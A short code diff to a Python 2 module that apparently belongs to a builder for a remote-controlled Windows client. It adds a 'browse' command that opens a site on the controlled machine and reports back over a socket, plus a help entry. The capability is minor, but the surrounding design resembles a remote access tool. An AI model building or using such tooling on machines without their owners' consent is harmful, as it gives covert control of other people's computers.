@@ -9,6 +9,7 @@ def main(option):
         config.import_statements.append('import webbrowser')
         config.functions.append('''
 def browse(site):
+    site = site.split(' ',1)[1]
     open_bool = webbrowser.open(site)
     if open_bool:
         s.sendall('[+]Opened site : ' + site)
@@ -17,8 +18,9 @@ def browse(site):
         config.logics.append('''
             elif command == "browse":
                 browse(data)''')
+        config.help_menu['browse <site>'] = 'Opens a new browser to the specified site'
     elif option == 'info':
-        print '\nName             : Browse component' \
+        print '\nName             : Browser component' \
               '\nOS               : Windows' \
               '\nRequired Modules : webbrowser' \
               '\nCommands         : browse <site>' \
